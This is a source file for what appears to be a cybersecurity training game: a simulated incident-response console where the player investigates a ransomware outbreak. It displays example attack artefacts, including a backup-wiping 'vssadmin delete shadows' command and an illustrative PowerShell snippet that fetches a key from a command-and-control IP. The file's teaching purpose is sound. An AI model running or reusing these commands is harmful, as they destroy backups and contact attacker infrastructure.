// EDRApp.tsx - Endpoint Detection & Response (SOC Incident Response Console) for Mission 4

import React, { useState } from 'react';
import { gameState, SecurityDecision } from '../../game/systems/GameState';
import { EDR_CLUES, EDR_INCIDENT_DATA, EDRClue } from '../../game/data/gameContent';
import { audioSystem } from '../../game/systems/AudioSystem';
import {
  ShieldAlert,
  Server,
  Activity,
  Network,
  HardDrive,
  FileText,
  AlertTriangle,
  CheckCircle2,
  Lock,
  Terminal,
  Search,
  ExternalLink,
  Cpu,
  Radio,
  Zap,
  X
} from 'lucide-react';

interface EDRAppProps {
  onDecisionMade: (decision: SecurityDecision) => void;
}

export const EDRApp: React.FC<EDRAppProps> = ({ onDecisionMade }) => {
  const [activeTab, setActiveTab] = useState<'processes' | 'network' | 'files'>('processes');
  const [selectedPid, setSelectedPid] = useState<number>(8840); // default to powershell.exe
  const [selectedClue, setSelectedClue] = useState<EDRClue | null>(null);
  const [showDecisionModal, setShowDecisionModal] = useState(false);
  const [pendingDecision, setPendingDecision] = useState<SecurityDecision | null>(null);
  const [showRansomNoteModal, setShowRansomNoteModal] = useState(false);

  const state = gameState.getState();
  const discoveredClues = state.discoveredClues;
  const investigationScore = state.investigationScore;

  const handleInspect = (clueId: string) => {
    const clue = EDR_CLUES.find((c) => c.id === clueId);
    if (!clue) return;

    audioSystem.play('interaction');
    setSelectedClue(clue);
    gameState.addClue(clue.id, clue.scoreBonus);
  };

  const handleChooseDecision = (choice: SecurityDecision) => {
    audioSystem.play('computer_click');
    setPendingDecision(null);
    onDecisionMade(choice);
  };

  const selectedProcess = EDR_INCIDENT_DATA.activeProcesses.find((p) => p.pid === selectedPid);

  return (
    <div
      style={{
        display: 'flex',
        flexDirection: 'column',
        height: '100%',
        backgroundColor: '#0a0d14',
        color: '#cde2f5',
        fontFamily: 'var(--font-mono)',
        overflow: 'hidden'
      }}
    >
      {/* 1. TOP TELEMETRY BANNER (Host Status & Critical Alert) */}
      <div
        style={{
          padding: '12px 18px',
          backgroundColor: 'rgba(255, 40, 75, 0.08)',
          borderBottom: '2px solid rgba(255, 40, 75, 0.4)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          gap: '16px',
          flexShrink: 0
        }}
      >
        {/* Host Identity & Threat Level */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div
            style={{
              width: '42px',
              height: '42px',
              backgroundColor: 'rgba(255, 51, 85, 0.2)',
              border: '2px solid var(--neon-red)',
              borderRadius: '6px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              boxShadow: '0 0 15px rgba(255, 51, 85, 0.4)'
            }}
          >
            <ShieldAlert size={24} color="var(--neon-red)" />
          </div>

          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span style={{ fontFamily: 'var(--font-pixel)', fontSize: '11px', color: '#fff', letterSpacing: '1px' }}>
                {EDR_INCIDENT_DATA.hostname}
              </span>
              <span
                style={{
                  fontSize: '9px',
                  backgroundColor: 'rgba(255, 51, 85, 0.25)',
                  color: 'var(--neon-red)',
                  border: '1px solid var(--neon-red)',
                  padding: '1px 6px',
                  borderRadius: '3px',
                  fontWeight: 'bold'
                }}
                className="animate-pulse"
              >
                CRITICAL OUTBREAK
              </span>
            </div>
            <div style={{ fontSize: '11px', color: '#8aa3be', display: 'flex', gap: '12px', marginTop: '2px' }}>
              <span>IP: <strong style={{ color: '#fff' }}>{EDR_INCIDENT_DATA.ipAddress}</strong></span>
              <span>OS: Windows Server 2022</span>
              <span>Threat: <strong style={{ color: 'var(--neon-red)' }}>{EDR_INCIDENT_DATA.threatFamily}</strong></span>
            </div>
          </div>
        </div>

        {/* Live Gauges (CPU, Disk I/O, Clues) */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
          {/* CPU Usage */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Cpu size={18} color="var(--neon-amber)" />
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>CPU LOAD</div>
              <div style={{ fontSize: '12px', color: 'var(--neon-amber)', fontWeight: 'bold' }}>{EDR_INCIDENT_DATA.cpuUsage}</div>
            </div>
          </div>

          {/* Disk I/O */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <HardDrive size={18} color="var(--neon-red)" />
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>DISK WRITE</div>
              <div style={{ fontSize: '12px', color: 'var(--neon-red)', fontWeight: 'bold' }}>{EDR_INCIDENT_DATA.diskIoRate}</div>
            </div>
          </div>

          {/* Clues Tracker */}
          <div
            style={{
              padding: '6px 14px',
              backgroundColor: '#121d2d',
              border: '1px solid var(--cyan-bright)',
              borderRadius: '4px',
              textAlign: 'center'
            }}
          >
            <div style={{ fontSize: '9px', color: 'var(--cyan-bright)', letterSpacing: '1px' }}>CLUES ANALYZED</div>
            <div style={{ fontFamily: 'var(--font-pixel)', fontSize: '12px', color: '#fff', marginTop: '2px' }}>
              {discoveredClues.filter(c => c.startsWith('CLUE-EDR')).length} / 4
            </div>
          </div>
        </div>
      </div>

      {/* 2. TAB NAVIGATION */}
      <div
        style={{
          display: 'flex',
          backgroundColor: '#070a10',
          borderBottom: '1px solid #1a2738',
          padding: '0 16px',
          gap: '8px',
          flexShrink: 0
        }}
      >
        <button
          onClick={() => { audioSystem.play('computer_click'); setActiveTab('processes'); }}
          style={{
            padding: '10px 16px',
            background: activeTab === 'processes' ? '#111a28' : 'none',
            border: 'none',
            borderBottom: activeTab === 'processes' ? '2px solid var(--cyan-bright)' : '2px solid transparent',
            color: activeTab === 'processes' ? '#fff' : '#6f8ba6',
            fontSize: '11px',
            fontFamily: 'var(--font-mono)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <Activity size={14} color={activeTab === 'processes' ? 'var(--cyan-bright)' : '#6f8ba6'} />
          PROCESS LINEAGE TREE
        </button>

        <button
          onClick={() => { audioSystem.play('computer_click'); setActiveTab('network'); }}
          style={{
            padding: '10px 16px',
            background: activeTab === 'network' ? '#111a28' : 'none',
            border: 'none',
            borderBottom: activeTab === 'network' ? '2px solid var(--cyan-bright)' : '2px solid transparent',
            color: activeTab === 'network' ? '#fff' : '#6f8ba6',
            fontSize: '11px',
            fontFamily: 'var(--font-mono)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <Network size={14} color={activeTab === 'network' ? 'var(--cyan-bright)' : '#6f8ba6'} />
          NETWORK & C2 SOCKETS
        </button>

        <button
          onClick={() => { audioSystem.play('computer_click'); setActiveTab('files'); }}
          style={{
            padding: '10px 16px',
            background: activeTab === 'files' ? '#111a28' : 'none',
            border: 'none',
            borderBottom: activeTab === 'files' ? '2px solid var(--cyan-bright)' : '2px solid transparent',
            color: activeTab === 'files' ? '#fff' : '#6f8ba6',
            fontSize: '11px',
            fontFamily: 'var(--font-mono)',
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <HardDrive size={14} color={activeTab === 'files' ? 'var(--cyan-bright)' : '#6f8ba6'} />
          FILE EVENT STREAM & EXTORTION NOTE
        </button>
      </div>

      {/* 3. MAIN WORK AREA */}
      <div style={{ flex: 1, minHeight: 0, display: 'flex', overflow: 'hidden' }}>
        {/* ========================================================================= */}
        {/* TAB 1: PROCESS TREE EXPLORER */}
        {/* ========================================================================= */}
        {activeTab === 'processes' && (
          <div style={{ display: 'flex', flex: 1, minHeight: 0 }}>
            {/* Left: Interactive Process Tree Hierarchy */}
            <div
              style={{
                flex: '0 0 55%',
                borderRight: '1px solid #1a2738',
                padding: '20px',
                overflowY: 'auto'
              }}
            >
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginBottom: '14px', letterSpacing: '1px' }}>
                ACTIVE PROCESS TREE (CLICK TO INSPECT):
              </div>

              {/* Node 1: explorer.exe */}
              <div
                onClick={() => { audioSystem.play('computer_click'); setSelectedPid(4120); }}
                style={{
                  padding: '10px 14px',
                  backgroundColor: selectedPid === 4120 ? '#162235' : '#0e1420',
                  border: `1px solid ${selectedPid === 4120 ? 'var(--cyan-bright)' : '#1c2838'}`,
                  borderRadius: '4px',
                  cursor: 'pointer',
                  marginBottom: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between'
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <Terminal size={15} color="var(--text-muted)" />
                  <span style={{ color: '#fff', fontSize: '12px' }}>explorer.exe</span>
                  <span style={{ fontSize: '10px', color: 'var(--text-muted)' }}>[PID: 4120]</span>
                </div>
                <span style={{ fontSize: '10px', color: 'var(--neon-green)' }}>Normal Shell</span>
              </div>

              {/* Level 1 Child: WINWORD.EXE */}
              <div style={{ marginLeft: '24px', position: 'relative' }}>
                <div
                  style={{
                    position: 'absolute',
                    top: '-10px',
                    left: '-14px',
                    width: '12px',
                    height: '24px',
                    borderLeft: '2px solid #2a3c54',
                    borderBottom: '2px solid #2a3c54'
                  }}
                />

                <div
                  onClick={() => {
                    audioSystem.play('computer_click');
                    setSelectedPid(7892);
                    handleInspect('CLUE-EDR-01');
                  }}
                  style={{
                    padding: '12px 14px',
                    backgroundColor: selectedPid === 7892 ? '#241a18' : '#141018',
                    border: `1px solid ${selectedPid === 7892 ? 'var(--neon-amber)' : 'rgba(255, 170, 40, 0.4)'}`,
                    borderRadius: '4px',
                    cursor: 'pointer',
                    marginBottom: '10px',
                    boxShadow: '0 0 10px rgba(255, 170, 40, 0.15)'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <FileText size={15} color="var(--neon-amber)" />
                      <span style={{ color: 'var(--neon-amber)', fontSize: '12px', fontWeight: 'bold' }}>
                        WINWORD.EXE
                      </span>
                      <span style={{ fontSize: '10px', color: '#aaa' }}>[PID: 7892]</span>
                    </div>
                    <span
                      style={{
                        fontSize: '9px',
                        backgroundColor: 'rgba(255, 170, 40, 0.2)',
                        color: 'var(--neon-amber)',
                        padding: '1px 6px',
                        borderRadius: '2px'
                      }}
                    >
                      SUSPICIOUS MACRO
                    </span>
                  </div>
                  <div style={{ fontSize: '11px', color: '#c5d5e8', marginTop: '6px' }}>
                    File: <code style={{ color: '#fff' }}>Q4_Invoice_Audit.docm</code> (VBA auto-exec enabled)
                  </div>
                  {discoveredClues.includes('CLUE-EDR-01') ? (
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '6px', color: 'var(--neon-green)', fontSize: '10px' }}>
                      <CheckCircle2 size={12} /> CLUE IDENTIFIED: LOLBin Spawning Anomaly (+25 XP)
                    </div>
                  ) : (
                    <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '6px', color: 'var(--neon-amber)', fontSize: '10px' }}>
                      <AlertTriangle size={12} /> CLICK TO INVESTIGATE PROCESS SPAWN
                    </div>
                  )}
                </div>

                {/* Level 2 Child: powershell.exe -enc */}
                <div style={{ marginLeft: '24px', position: 'relative' }}>
                  <div
                    style={{
                      position: 'absolute',
                      top: '-10px',
                      left: '-14px',
                      width: '12px',
                      height: '24px',
                      borderLeft: '2px solid #2a3c54',
                      borderBottom: '2px solid #2a3c54'
                    }}
                  />

                  <div
                    onClick={() => {
                      audioSystem.play('computer_click');
                      setSelectedPid(8840);
                      handleInspect('CLUE-EDR-01');
                    }}
                    style={{
                      padding: '12px 14px',
                      backgroundColor: selectedPid === 8840 ? '#2a111a' : '#1a0b12',
                      border: `1px solid ${selectedPid === 8840 ? 'var(--neon-red)' : 'rgba(255, 51, 85, 0.6)'}`,
                      borderRadius: '4px',
                      cursor: 'pointer',
                      marginBottom: '10px',
                      boxShadow: '0 0 14px rgba(255, 51, 85, 0.25)'
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <Terminal size={15} color="var(--neon-red)" />
                        <span style={{ color: 'var(--neon-red)', fontSize: '12px', fontWeight: 'bold' }}>
                          powershell.exe -WindowStyle Hidden
                        </span>
                        <span style={{ fontSize: '10px', color: '#aaa' }}>[PID: 8840]</span>
                      </div>
                      <span
                        style={{
                          fontSize: '9px',
                          backgroundColor: 'rgba(255, 51, 85, 0.3)',
                          color: 'var(--neon-red)',
                          padding: '1px 6px',
                          borderRadius: '2px',
                          fontWeight: 'bold'
                        }}
                        className="animate-blink"
                      >
                        ACTIVE ENCRYPTOR
                      </span>
                    </div>
                    <div style={{ fontSize: '11px', color: '#ffb5c0', marginTop: '6px' }}>
                      Args: <code style={{ color: '#fff', fontSize: '10px' }}>-enc JAB3AGMAYwBsAGkAZQ...</code> (Obfuscated Base64)
                    </div>
                  </div>

                  {/* Level 3 Child: vssadmin.exe delete shadows */}
                  <div style={{ marginLeft: '24px', position: 'relative' }}>
                    <div
                      style={{
                        position: 'absolute',
                        top: '-10px',
                        left: '-14px',
                        width: '12px',
                        height: '24px',
                        borderLeft: '2px solid #2a3c54',
                        borderBottom: '2px solid #2a3c54'
                      }}
                    />

                    <div
                      onClick={() => {
                        audioSystem.play('computer_click');
                        setSelectedPid(9104);
                        handleInspect('CLUE-EDR-02');
                      }}
                      style={{
                        padding: '12px 14px',
                        backgroundColor: selectedPid === 9104 ? '#2a111a' : '#140810',
                        border: `1px solid ${selectedPid === 9104 ? 'var(--neon-red)' : 'rgba(255, 51, 85, 0.5)'}`,
                        borderRadius: '4px',
                        cursor: 'pointer',
                        marginBottom: '10px'
                      }}
                    >
                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                          <Zap size={15} color="var(--neon-red)" />
                          <span style={{ color: 'var(--neon-red)', fontSize: '12px', fontWeight: 'bold' }}>
                            vssadmin.exe delete shadows /all /quiet
                          </span>
                          <span style={{ fontSize: '10px', color: '#aaa' }}>[PID: 9104]</span>
                        </div>
                        <span
                          style={{
                            fontSize: '9px',
                            backgroundColor: 'rgba(255, 51, 85, 0.25)',
                            color: 'var(--neon-red)',
                            padding: '1px 6px',
                            borderRadius: '2px'
                          }}
                        >
                          BACKUP PURGE
                        </span>
                      </div>
                      <div style={{ fontSize: '11px', color: '#ffc8cf', marginTop: '6px' }}>
                        Executing shadow copy wipe to destroy local rollback restore points.
                      </div>
                      {discoveredClues.includes('CLUE-EDR-02') ? (
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '6px', color: 'var(--neon-green)', fontSize: '10px' }}>
                          <CheckCircle2 size={12} /> CLUE IDENTIFIED: Shadow Copy Destruction (+25 XP)
                        </div>
                      ) : (
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px', marginTop: '6px', color: 'var(--neon-red)', fontSize: '10px' }}>
                          <AlertTriangle size={12} /> CLICK TO EXAMINE BACKUP PURGE
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Right: Selected Process Forensics Inspector */}
            <div
              style={{
                flex: '0 0 45%',
                padding: '20px',
                backgroundColor: '#0c121e',
                overflowY: 'auto'
              }}
            >
              <div style={{ fontSize: '11px', color: 'var(--cyan-bright)', marginBottom: '14px', letterSpacing: '1px' }}>
                PROCESS FORENSIC INSPECTOR:
              </div>

              {selectedProcess && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
                  <div style={{ padding: '12px', backgroundColor: '#131b2c', borderRadius: '4px', border: '1px solid #1f2d44' }}>
                    <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>PROCESS NAME</div>
                    <div style={{ fontSize: '14px', color: '#fff', fontWeight: 'bold', marginTop: '2px' }}>
                      {selectedProcess.name}
                    </div>
                    <div style={{ fontSize: '11px', color: '#8aa3be', marginTop: '4px' }}>
                      PID: {selectedProcess.pid} {selectedProcess.parentPid && `| Parent PID: ${selectedProcess.parentPid}`}
                    </div>
                  </div>

                  <div style={{ padding: '12px', backgroundColor: '#131b2c', borderRadius: '4px', border: '1px solid #1f2d44' }}>
                    <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>COMMAND LINE ARGUMENTS</div>
                    <pre
                      style={{
                        margin: '6px 0 0',
                        fontSize: '11px',
                        color: selectedProcess.pid === 8840 || selectedProcess.pid === 9104 ? 'var(--neon-red)' : '#fff',
                        wordBreak: 'break-all',
                        whiteSpace: 'pre-wrap',
                        fontFamily: 'var(--font-mono)'
                      }}
                    >
                      {selectedProcess.cmd}
                    </pre>
                  </div>

                  <div style={{ padding: '12px', backgroundColor: '#131b2c', borderRadius: '4px', border: '1px solid #1f2d44' }}>
                    <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>EXECUTION CONTEXT</div>
                    <div style={{ fontSize: '12px', color: '#fff', marginTop: '4px' }}>
                      User Account: <code style={{ color: 'var(--neon-amber)' }}>{selectedProcess.user}</code>
                    </div>
                    <div style={{ fontSize: '12px', color: '#fff', marginTop: '4px' }}>
                      Status: <strong style={{ color: selectedProcess.pid === 8840 ? 'var(--neon-red)' : 'var(--neon-green)' }}>{selectedProcess.status}</strong>
                    </div>
                  </div>

                  {selectedProcess.pid === 8840 && (
                    <div
                      style={{
                        padding: '12px',
                        backgroundColor: 'rgba(255, 51, 85, 0.1)',
                        border: '1px solid var(--neon-red)',
                        borderRadius: '4px'
                      }}
                    >
                      <div style={{ fontSize: '11px', color: 'var(--neon-red)', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '6px' }}>
                        <AlertTriangle size={14} /> DECODED POWERSHELL PAYLOAD:
                      </div>
                      <pre
                        style={{
                          margin: '8px 0 0',
                          fontSize: '10px',
                          color: '#fff',
                          whiteSpace: 'pre-wrap',
                          fontFamily: 'var(--font-mono)'
                        }}
                      >
{`$wc = New-Object System.Net.WebClient;
$key = $wc.DownloadData("https://194.26.29.112:8443/enc.key");
$files = Get-ChildItem -Path "D:\\Shares\\" -Recurse;
foreach ($f in $files) { [LockBit]::EncryptFile($f, $key); }`}
                      </pre>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB 2: NETWORK & C2 SOCKET MONITOR */}
        {/* ========================================================================= */}
        {activeTab === 'network' && (
          <div style={{ flex: 1, padding: '20px', overflowY: 'auto' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', letterSpacing: '1px' }}>
                ACTIVE HOST NETWORK SOCKETS & TELEMETRY:
              </div>
              <div style={{ fontSize: '11px', color: 'var(--neon-red)', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Radio size={14} className="animate-pulse" /> 2 MALICIOUS CONNECTIONS DETECTED
              </div>
            </div>

            {/* Sockets Table */}
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
              <thead>
                <tr style={{ backgroundColor: '#0f1724', borderBottom: '2px solid #1e2c40', color: 'var(--text-muted)', textAlign: 'left' }}>
                  <th style={{ padding: '10px 12px' }}>PROTO</th>
                  <th style={{ padding: '10px 12px' }}>LOCAL ADDRESS</th>
                  <th style={{ padding: '10px 12px' }}>REMOTE ADDRESS</th>
                  <th style={{ padding: '10px 12px' }}>SOCKET STATE</th>
                  <th style={{ padding: '10px 12px' }}>ASSOCIATED PROCESS</th>
                  <th style={{ padding: '10px 12px' }}>ACTION</th>
                </tr>
              </thead>
              <tbody>
                {EDR_INCIDENT_DATA.networkSockets.map((s, idx) => (
                  <tr
                    key={idx}
                    style={{
                      borderBottom: '1px solid #1a2536',
                      backgroundColor: s.isMalicious ? 'rgba(255, 51, 85, 0.08)' : 'transparent'
                    }}
                  >
                    <td style={{ padding: '12px', fontWeight: 'bold' }}>{s.proto}</td>
                    <td style={{ padding: '12px', color: '#8fa4be' }}>{s.localAddr}</td>
                    <td style={{ padding: '12px' }}>
                      <span
                        style={{
                          color: s.isMalicious ? 'var(--neon-red)' : '#fff',
                          fontWeight: s.isMalicious ? 'bold' : 'normal'
                        }}
                      >
                        {s.remoteAddr}
                      </span>
                    </td>
                    <td style={{ padding: '12px' }}>
                      <span
                        style={{
                          color: s.isMalicious ? 'var(--neon-red)' : 'var(--neon-green)',
                          fontSize: '11px'
                        }}
                      >
                        {s.state}
                      </span>
                    </td>
                    <td style={{ padding: '12px', color: s.isMalicious ? 'var(--neon-amber)' : '#8fa4be' }}>
                      {s.process}
                    </td>
                    <td style={{ padding: '12px' }}>
                      {s.remoteAddr.includes('194.26.29.112') ? (
                        <button
                          onClick={() => handleInspect('CLUE-EDR-03')}
                          className="cyber-button"
                          style={{
                            padding: '4px 10px',
                            fontSize: '10px',
                            borderColor: discoveredClues.includes('CLUE-EDR-03') ? 'var(--neon-green)' : 'var(--neon-red)',
                            color: discoveredClues.includes('CLUE-EDR-03') ? 'var(--neon-green)' : 'var(--neon-red)'
                          }}
                        >
                          {discoveredClues.includes('CLUE-EDR-03') ? '✓ C2 EXAMINED' : 'INSPECT C2 BEACON'}
                        </button>
                      ) : s.remoteAddr.includes('10.0.4.50') ? (
                        <button
                          onClick={() => handleInspect('CLUE-EDR-04')}
                          className="cyber-button"
                          style={{
                            padding: '4px 10px',
                            fontSize: '10px',
                            borderColor: discoveredClues.includes('CLUE-EDR-04') ? 'var(--neon-green)' : 'var(--neon-amber)',
                            color: discoveredClues.includes('CLUE-EDR-04') ? 'var(--neon-green)' : 'var(--neon-amber)'
                          }}
                        >
                          {discoveredClues.includes('CLUE-EDR-04') ? '✓ PROBE EXAMINED' : 'INSPECT SMB PROBE'}
                        </button>
                      ) : (
                        <span style={{ fontSize: '11px', color: 'var(--text-muted)' }}>Verified Safe</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>

            {/* Explanatory Cards */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginTop: '20px' }}>
              <div style={{ padding: '14px', backgroundColor: '#111824', borderRadius: '4px', border: '1px solid #1c2738' }}>
                <div style={{ fontSize: '11px', color: 'var(--neon-red)', fontWeight: 'bold', marginBottom: '6px' }}>
                  📡 COMMAND & CONTROL (C2) BEACON ANALYSIS
                </div>
                <p style={{ fontSize: '12px', lineHeight: '1.6', color: '#b5cde2', margin: 0 }}>
                  Host <code style={{ color: '#fff' }}>10.0.4.15</code> is sending encrypted TLS heartbeats to offshore IP <code style={{ color: 'var(--neon-red)' }}>194.26.29.112:8443</code> every 45s. The adversary is using this channel to pull telemetry and push encryption keys.
                </p>
              </div>

              <div style={{ padding: '14px', backgroundColor: '#111824', borderRadius: '4px', border: '1px solid #1c2738' }}>
                <div style={{ fontSize: '11px', color: 'var(--neon-amber)', fontWeight: 'bold', marginBottom: '6px' }}>
                  🛡️ LATERAL SPREAD PROBE (PORT 445 SMB)
                </div>
                <p style={{ fontSize: '12px', lineHeight: '1.6', color: '#b5cde2', margin: 0 }}>
                  The compromised host is attempting rapid TCP connections to <code style={{ color: '#fff' }}>BACKUP-VAULT-01 (10.0.4.50)</code> over SMB Port 445. If the vault share is mounted, the ransomware will encrypt our offline secondary backups!
                </p>
              </div>
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB 3: FILE EVENT STREAM & EXTORTION NOTE */}
        {/* ========================================================================= */}
        {activeTab === 'files' && (
          <div style={{ flex: 1, padding: '20px', overflowY: 'auto' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '14px' }}>
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', letterSpacing: '1px' }}>
                REAL-TIME DISK I/O EVENT LOG (LATEST FILE WRITES):
              </div>
              <button
                onClick={() => { audioSystem.play('computer_click'); setShowRansomNoteModal(true); }}
                className="cyber-button"
                style={{
                  padding: '6px 14px',
                  fontSize: '11px',
                  borderColor: 'var(--neon-red)',
                  color: 'var(--neon-red)',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px'
                }}
              >
                <FileText size={14} /> VIEW DROPPED RANSOM NOTE
              </button>
            </div>

            {/* Live Event Stream */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {EDR_INCIDENT_DATA.fileActivity.map((event, idx) => (
                <div
                  key={idx}
                  style={{
                    padding: '10px 14px',
                    backgroundColor: '#101622',
                    border: '1px solid #1a2536',
                    borderRadius: '4px',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'space-between',
                    fontSize: '11px'
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    <span style={{ color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>{event.time}</span>
                    <span
                      style={{
                        padding: '2px 6px',
                        borderRadius: '2px',
                        fontWeight: 'bold',
                        backgroundColor:
                          event.tag === 'ENCRYPTED'
                            ? 'rgba(255, 51, 85, 0.2)'
                            : event.tag === 'RANSOM_NOTE'
                            ? 'rgba(255, 170, 40, 0.2)'
                            : 'rgba(0, 210, 230, 0.2)',
                        color:
                          event.tag === 'ENCRYPTED'
                            ? 'var(--neon-red)'
                            : event.tag === 'RANSOM_NOTE'
                            ? 'var(--neon-amber)'
                            : 'var(--cyan-bright)'
                      }}
                    >
                      {event.action}
                    </span>
                    <code style={{ color: '#fff' }}>{event.path}</code>
                  </div>
                  <span style={{ fontSize: '10px', color: 'var(--text-muted)' }}>{event.tag}</span>
                </div>
              ))}
            </div>

            {/* Encryption Counter Banner */}
            <div
              style={{
                marginTop: '20px',
                padding: '14px',
                backgroundColor: 'rgba(255, 51, 85, 0.12)',
                border: '1px solid var(--neon-red)',
                borderRadius: '4px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between'
              }}
            >
              <div>
                <div style={{ fontSize: '11px', color: 'var(--neon-red)', fontWeight: 'bold' }}>
                  ⚠ ENCRYPTION CLOCK TICKING
                </div>
                <div style={{ fontSize: '12px', color: '#c5d8ec', marginTop: '2px' }}>
                  18 files have already been renamed with the <code style={{ color: 'var(--neon-red)' }}>.locked</code> extension. Immediate containment required!
                </div>
              </div>
              <div style={{ textAlign: 'right' }}>
                <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>ESTIMATED TIME TO FULL LOCK</div>
                <div style={{ fontFamily: 'var(--font-pixel)', fontSize: '14px', color: 'var(--neon-red)' }}>
                  02:45
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 4. BOTTOM ACTION & CONTAINMENT BAR */}
      <div
        style={{
          padding: '12px 20px',
          backgroundColor: '#070b12',
          borderTop: '2px solid #1a2538',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          flexShrink: 0
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <ShieldAlert size={18} color="var(--neon-red)" />
          <span style={{ fontSize: '12px', color: '#c5d8ec' }}>
            Evidence collected: <strong>{discoveredClues.filter(c => c.startsWith('CLUE-EDR')).length} of 4 clues</strong>
          </span>
        </div>

        <button
          onClick={() => {
            audioSystem.play('computer_click');
            setShowDecisionModal(true);
          }}
          className="cyber-button"
          style={{
            padding: '10px 22px',
            fontSize: '11px',
            borderColor: 'var(--neon-red)',
            color: 'var(--neon-red)',
            boxShadow: '0 0 16px rgba(255, 51, 85, 0.35)'
          }}
        >
          🚨 INCIDENT CONTAINMENT MATRIX
        </button>
      </div>

      {/* ========================================================================= */}
      {/* MODAL 1: CLUE EVIDENCE POPUP */}
      {/* ========================================================================= */}
      {selectedClue && (
        <div
          style={{
            position: 'absolute',
            inset: 0,
            backgroundColor: 'rgba(4, 7, 14, 0.85)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1500,
            padding: '24px'
          }}
        >
          <div
            className="cyber-panel"
            style={{
              width: '100%',
              maxWidth: '520px',
              padding: '24px',
              backgroundColor: '#0c121e',
              border: '2px solid var(--cyan-bright)',
              boxShadow: '0 0 30px rgba(0, 210, 230, 0.25)'
            }}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <CheckCircle2 size={18} color="var(--neon-green)" />
                <span style={{ fontFamily: 'var(--font-pixel)', fontSize: '11px', color: 'var(--cyan-bright)' }}>
                  FORENSIC CLUE LOGGED
                </span>
              </div>
              <span style={{ fontSize: '10px', color: 'var(--sunset-gold)', fontWeight: 'bold' }}>
                +{selectedClue.scoreBonus} XP
              </span>
            </div>

            <h3 style={{ fontFamily: 'var(--font-pixel)', fontSize: '13px', color: '#fff', margin: '0 0 10px' }}>
              {selectedClue.name}
            </h3>

            <div style={{ padding: '10px', backgroundColor: '#131b2c', borderRadius: '4px', marginBottom: '12px' }}>
              <div style={{ fontSize: '10px', color: 'var(--text-muted)' }}>EVIDENCE FINDING:</div>
              <div style={{ fontSize: '12px', color: 'var(--neon-amber)', marginTop: '2px', fontWeight: 'bold' }}>
                {selectedClue.finding}
              </div>
            </div>

            <p style={{ fontSize: '12px', lineHeight: '1.7', color: '#c5d8ec', margin: '0 0 20px' }}>
              {selectedClue.explanation}
            </p>

            <button
              onClick={() => { audioSystem.play('computer_click'); setSelectedClue(null); }}
              className="cyber-button"
              style={{ width: '100%', padding: '10px', fontSize: '11px' }}
            >
              CONTINUE INVESTIGATION
            </button>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODAL 2: DROPPED RANSOM NOTE VIEWER */}
      {/* ========================================================================= */}
      {showRansomNoteModal && (
        <div
          style={{
            position: 'absolute',
            inset: 0,
